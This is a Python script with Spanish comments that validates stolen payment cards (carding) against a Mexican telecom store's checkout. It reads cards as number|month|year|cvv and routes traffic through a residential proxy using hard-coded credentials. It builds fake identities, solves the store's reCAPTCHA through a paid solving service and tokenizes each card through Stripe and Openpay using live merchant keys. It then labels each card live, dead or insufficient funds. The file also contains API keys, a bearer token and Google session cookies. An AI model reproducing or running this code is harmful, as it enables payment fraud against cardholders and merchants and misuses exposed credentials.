from tarfile import data_filter
import random, time
from faker import Faker
from random import choice
from tkinter import Tk, filedialog
from httpx import request
import requests,re
from bs4 import BeautifulSoup as b
from bs4 import BeautifulSoup
#from hh import keep_alive
import requests
import json, string, re
import requests
import time
import json
import random, time
from faker import Faker
from random import choice
import asyncio
import requests
from bs4 import BeautifulSoup
import requests
import re
from bs4 import BeautifulSoup as b
from curl_cffi import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import json
import cloudscraper
from anticaptchaofficial.recaptchav2proxyless import *
from anticaptchaofficial.recaptchav2proxyless import *

import time
def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None



async def process_card(card: str) -> str:    
    max_retries = 15
    retry_count = 0
    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
            proxy_user = "package-310562-country-mx-city-merida-isp-telmex+dsl"
            proxy_pass = "2P5V1zr0HaKb2zBs"
            proxy_host = "proxy.soax.com"
            proxy_port = 5000

            # Crear la URL del proxy
            proxy_url = f"http://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}"

            # Crear sesión
            c = requests.Session()

            # Configurar proxy en la sesión
            c.proxies = {
                "http": proxy_url,
                "https": proxy_url,
            }

            
            
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
            agente_user = UserAgent()

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']
           

            #============[Requests 1]============#
            c =  requests.Session()
            
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
            agente_user = UserAgent()
            

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']

            #============[Requests 1]============#

            correos = [
                "marilisaqnituk@gmail.com",
                "flortsquitk@gmail.com",
                "quitukferchag@gmail.com",
                "saramanquitk@gmail.com",
                "jorgaioquint@gmail.com",
                "rodrigoking234@gmail.com",
                "rodrigoquituk004@gmail.com",
                "armeida.cate771@gmail.com",
                "viquitukeliander@gmail.com",
                "quityksantome@gmail.com",
                "samanquitguajal@gmail.com",
                "quintkdelgelo@gmail.com",
                "squitukjomilu@gmail.com",
                "lauranquinyuk@gmail.com",
                "rodrigoqgomez@gmail.com",
                "gardunoerick2@gmail.com"
            ]

            correo_seleccionado = random.choice(correos)
            headers = {
                'authority': 'ultravision.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'origin': 'https://tienda.ultracel.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://tienda.ultracel.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'imei': '353495111910597',
                'sim_card_type': 'embedded',
            }

            response = c.get('https://ultravision.api.koonolmexico.com/altan/imei_check', params=params, headers=headers)
            

            headers = {
                'authority': 'ultravision.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiI3NDVlOTk5ZS1lNWY4LTQxMmMtYTNhYS1jNzZkMzZmNmEwMjAifQ.hbskLok4zoK-KUN64liDaNoWyEHx1eCMokI67UIWifc',
                'cache-control': 'no-cache',
                'origin': 'https://tienda.ultracel.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://tienda.ultracel.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'bundle_id': '75',
            }

            response = c.get('https://ultravision.api.koonolmexico.com/sim_cards/sim_cards', params=params, headers=headers)
            
            headers = {
                'authority': 'ultravision.api.koonolmexico.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json; charset=UTF-8',
                'origin': 'https://tienda.ultracel.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://tienda.ultracel.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'user': {
                    'signup_status': 'authorized',
                    'name': name,
                    'last_name': last,
                    'maiden_name': '',
                    'email': correo_seleccionado,
                    'phone': None,
                    'mobile_phone': '9971556986',
                    'privacy_acceptance': True,
                },
            }

            response = c.post('https://ultravision.api.koonolmexico.com/users', headers=headers, json=json_data)
            responsePm = json.loads(response.text)
            id_servicio = responsePm['user']['id']
            print(id_servicio)
            

            API_KEY = "cac59a01c519254119599acd1084d7c4"  # 🔴 Reemplázala con tu clave de Anti-Captcha
            SITE_KEY = "6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll"  # 🔹 Sitekey de reCAPTCHA
            URL_OBJETIVO = "https://tienda.ultracel.com.mx/paso-3"  # 🔹 Página con el reCAPTCHA

            api_key = "c9373bba28615938eb80b5b8a434ae8c"

            # URL del sitio donde se encuentra el reCAPTCHA
            website_url = "https://tienda.ultracel.com.mx/paso-3"

            # Sitekey del reCAPTCHA (obtenido del HTML del sitio)
            sitekey = "6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll"

            # Crear y configurar el solver
            solver = recaptchaV2Proxyless()
            solver.set_verbose(1)
            solver.set_key(api_key)
            solver.set_website_url(website_url)
            solver.set_website_key(sitekey)

            print("⏳ Enviando tarea a AntiCaptcha...")

            # Intentar resolver el CAPTCHA
            g_response = solver.solve_and_return_solution()

            if g_response != 0:
                print("✅ CAPTCHA resuelto correctamente.")
                

                # Puedes usar este token para enviarlo al formulario del sitio
            else:
                print(f"❌ Error al resolver CAPTCHA: {solver.error_code}")

            # 2. Esperar que Anti-Captcha resuelva el captcha
            

            headers = {
                'authority': 'www.google.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                # 'cookie': '__Secure-3PAPISID=RpxSH8Er4vu9_-vw/A7hRrCp8qg6w0Hp6l; __Secure-3PSIDTS=sidts-CjIB5H03P9FbtGATpvevBoYjOer4Nwuh7gM16VOOPIGcN4eVIA-ciUzANjEIrq4vNE0aBRAA; NID=524=Bek0erebHMhlGTrbCEdma4cvcnO0wOLhOukqnIl_u9znmY8XBKOrCXxbivgMoqbNpI1bBf099v2CSZQPlJnZxWISXv5xJ3zr3daxHYinXe5yguKeFl-huKvq_BZEhI2RTrDJxvh1G7RG2aQkZ_CIPmOoE7vl9BIH99opFuEBfsttncQQ9k9g4wUeZDBEQhoAJX1vSH1_wJP4LJOCUFsVMqKq-rgMV2jMXERsCL6MTPb9k965rTlf-ZfB2t_fLFRwLvD13OgWDjkmIL93BGeHT8dj_uweizLFm9smVZjK1s_Mb7pUv55S9k0KRHFgfnXnccSopr87nkuOxouixr_da6bXf1Gnid5Mx87MtEO_Hs657vpUAoGJ2BJALOXfD9b1TxHBgBC_bZEYbD5duqxamjzuzyOGBSOTLx8O-Y9PKUKi1pkHrGh9-6mnrSq1_wNNIXAuRqkkydRB8pQhPMJth9hLacvIFfohoHwmovCICfj9fLAe7ZSkSFXZ6DaqZsoY4p1SNQe4JA52-IZMoWvR2jtkY828XKDcMYPHrQ1oAKH0Wvz5oVjMljW-xCFs8TCW40tUKBtiHW7B0QyJ_tJtsbtdmOSj0fUOpKnSf_8R8Ber9fLqXO0pWbyDp1vSSIQyrit2Xx8DctdgB2eTzWGhb3B8VMZ2ma1-ei5RdaRWj-3lePpcfRFuOaP_naKO-9NiFiWKo7ASJxPbE_gNAnrDsguf_2ADk-c1IcUWEaRU27P92puZ0pIue3Bm1kC4I8y1v5A2doGf4CzNNl596nGBX4eNEA9nL1cziz_G9tFihekHuhiarIier2FXgrPfSPKlVsNOymJh3y_TSESgWyBllv0rf2FHOn3zZ2E4M2RN-VcrPS09xFg7QTmgt5EEFpNAGOS1SjBgHVGqoDGqwVyd5-SUTiROv5kZ-Lfqc7owVLvojMW5A3_bViStAao_G4fWfqdLUI1GsONzBSWkOlD1qOgloZx7zNCQA8QU6Rb1WM-CQEm_elffQkzwGKUYsftKTh9fCwkYplao87RrRq8vK48di6TBCs5Xct1aTSzNNlRY_SQTBfcat8UBEPbyAifhWhkhfdaJgABNkhpHKkLt20XRmwH0m3qI95G0rUn5xPNw1fWtiQx2gBZ-EKUFqIXdd7ysQrjwfitoaSurqj9DnL0O-ecF1EpP3LyohVfsr7-aq3FLi8uXXl9d3XqTzdTGMsa38-npXWI_0d_uQx1ICu0rsfnDXn39A-zo8m6c00E9m_3wpIDdztTEtXfy3G_ZnRtoLqKSFJ20AGDGjeVG8m5unNUGdGhcTVlL-qSGFSIVjUhAIgvUi9XCt-97WSgtDXPA2VjPPUqHs6vETlqkBA2qDdkcLdvSfO88vJkKsRfRnl0Bma26iB-sweZBamYVuXweaJwzDdYo7wR0X2c5XdyB-Er6EZtkgc_qlQ; __Secure-3PSID=g.a000yAgaJZAB-33BExEU7MPatksZyWbMvzEJu1MYf87QmE-9Hq2XHuv7egTyDyMgZFIi8BIdFQACgYKAYUSARYSFQHGX2MiqSKus2I6NDf0KOoh5a-bnRoVAUF8yKoJRk6WBabOlxQZyfARSaoC0076; __Secure-3PSIDCC=AKEyXzUQvIS12ThoxbbQc9u8ZRHCYAqqNRT5TtEtqTSRHJSQpBfFDbyklxue94v-oXJ5BrFr9XM',
                'origin': 'https://www.google.com',
                'pragma': 'no-cache',
                'referer': 'https://www.google.com/recaptcha/api2/bframe?hl=es&v=GUGrl5YkSwpBsxsF3eY665Ye&k=6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'x-client-data': 'CLuIywE=',
            }

            params = {
                'k': '6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll',
            }

            data = f'v=GUGrl5YkSwpBsxsF3eY665Ye&c={g_response}'

            response = c.post(
                'https://www.google.com/recaptcha/api2/userverify',
                params=params,
                headers=headers,
                data=data,
            )

            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-US',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'pragma': 'no-cache',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            data = f'time_on_page=21498&pasted_fields=number&guid=2953e2d9-6a1c-4c42-a83e-28bb4e237f8577fee5&muid=772b99bb-ce50-453b-b6e5-8546cad0ee15550ee6&sid=e0c65b9d-83dd-4e42-96fb-90d94cc5d6c0b77f5b&key=pk_live_51KKQdXAt4hwC9EzPlECBse8oe2zN759C4zpyQtIPxEhTjFnu6o0AWxouefUoWPPv2hV6a1H4fUWLwF8S1wVA8MLW00zHX9O87k&payment_user_agent=stripe.js%2F78ef418&card[number]={cc_number}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano_number}'

            response = c.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
            responsePm = json.loads(response.text)
            if "id" in responsePm:
                tokenst = responsePm["id"]
                print(tokenst)
            else:
                mensaje = f"Tarjeta rechazada:"
                status = "dead"
                return {"status": status, "message": mensaje, "cc": card}

            headers = {
                'authority': 'api.openpay.mx',
                'accept': 'application/json',
                'accept-language': 'es-ES,es;q=0.9',
                'authorization': 'Basic cGtfNWE0ZTlkNzY3NWQ4NDBiMTlkYTY1OWE1YWY1MTRjZjY6',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                'origin': 'https://tienda.ultracel.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://tienda.ultracel.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'holder_name': f'{name} {last} ',
                'card_number': cc_number,
                'cvv2': cvv,
                'expiration_month': mes,
                'expiration_year': ano_number[-2:],
            }

            response = c.post('https://api.openpay.mx/v1/mznycdanwswudouttxam/tokens', headers=headers, json=json_data)
            responsePm = json.loads(response.text)
            tokenop = responsePm['id']
            print(tokenop)


            headers = {
                'authority': 'ultravision.api.koonolmexico.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json; charset=UTF-8',
                'origin': 'https://tienda.ultracel.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://tienda.ultracel.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'payment_card': {
                    'openpay_token': tokenop,
                    'openpay_device_session_id': 'qjFpDcuM8Pf4ebPXPwEgr99Sl0DSNMz0',
                    'stripe_token': tokenst,
                    'is_default': True,
                    'payment_method': 'card',
                    'identification_number': None,
                    'mercado_pago_token': None,
                },
                'user_id': id_servicio,
            }

            response = c.post('https://ultravision.api.koonolmexico.com/payment_cards', headers=headers, json=json_data)
            time.sleep(2)
            responsePm = json.loads(response.text)
            #print(responsePm)

            # Variables por defecto
            # Variables por defecto
            status = "error"
            mensaje = ""

            if 'message' in responsePm and 'error' in responsePm['message']:
                error_info = responsePm['message']['error']
                error_code = error_info.get('code', '').lower()
                error_message = error_info.get('message', 'Error desconocido')

                if error_code == 'card_declined':
                    mensaje = f"Tarjeta rechazada: {error_message}"
                    status = "dead"

                elif error_code == 'insufficient_funds':
                    mensaje = f"Fondos insuficientes: {error_message}"
                    status = "insufficient_funds"

                else:
                    mensaje = f"Error: {error_message}"
                    status = "error"

            elif 'altan_service_bundle_order' in responsePm:
                st = responsePm['altan_service_bundle_order'].get('status', '').lower()
                if st in ['delivered', 'authorized']:
                    mensaje = "Aprobado"
                    status = "live"
                else:
                    mensaje = f"Estado: {st}"
                    status = "error"

            elif 'payment_card' in responsePm and 'created_at' in responsePm['payment_card']:
                fecha = responsePm['payment_card']['created_at']
                mensaje = f"Aprobado (Registrada) - Fecha: {fecha}"
                status = "live"

            else:
                mensaje = "Respuesta no reconocida"
                status = "error"

            print(f"{status.upper()}: {mensaje}")

            # <-- Aquí agregas la tarjeta al return -->
            return {"status": status, "message": mensaje, "cc": card}


        except Exception as e:
            print(e)
            retry_count += 1
    else:

        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}



